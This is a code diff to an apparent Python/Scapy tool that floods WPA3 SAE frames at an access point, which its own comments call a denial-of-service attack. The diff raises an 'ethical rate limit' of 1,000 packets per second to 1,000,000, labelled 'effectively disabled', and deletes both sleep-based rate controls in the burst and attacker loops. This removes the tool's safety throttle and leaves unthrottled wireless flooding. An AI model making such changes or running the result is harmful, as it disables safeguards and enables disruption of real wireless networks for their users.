@@ -44,7 +44,7 @@ AP_MAX_INACTIVITY = 300            # AP_MAX_INACTIVITY timeout (seconds)
 
 BURST_SIZE = 128                   # Standard burst size for reproducible DoS
 INTER_PACKET_GAP = 0.0001          # 100μs inter-packet delay (burst mode)
-PACKETS_PER_SECOND_LIMIT = 1000    # Ethical rate limit for controlled experiments
+PACKETS_PER_SECOND_LIMIT = 1000000 # Effectively disabled for maximum throughput
 
 SAE_GROUP_ID_19 = b'\x13\x00'      # ECC P-256 (mandatory group)
 SCALAR_BYTES = 32
@@ -241,11 +241,6 @@ def send_burst_scientific(packet_list: list, interface: str, counter: Value):
     try:
         sendp(batch, iface=interface, verbose=False, inter=INTER_PACKET_GAP, count=1)
         sent += len(batch)
-        # Rate control
-        elapsed = time.time() - start
-        target_time = sent / PACKETS_PER_SECOND_LIMIT
-        if elapsed < target_time:
-            time.sleep(target_time - elapsed)
         with counter.get_lock():
             counter.value += len(batch)
     except Exception as e:
@@ -439,8 +434,6 @@ def run_attacker_process(interface, bssid, channel, band, attack_type, scalar_he
                 burst_count += 1
                 dt = time.time() - t_start
                 logger.info(f"[BURST] {interface} ({band}, CH {channel}) | Type: {attack_type} | Count: {burst_count} | Time: {dt:.3f}s")
-            # Scientific sleep to maintain target rate & avoid driver starvation
-            time.sleep(max(0.01, 1.0 / (PACKETS_PER_SECOND_LIMIT / BURST_SIZE)))
 
     except KeyboardInterrupt:
         logger.info(f"[STOP] {interface} interrupted by user")
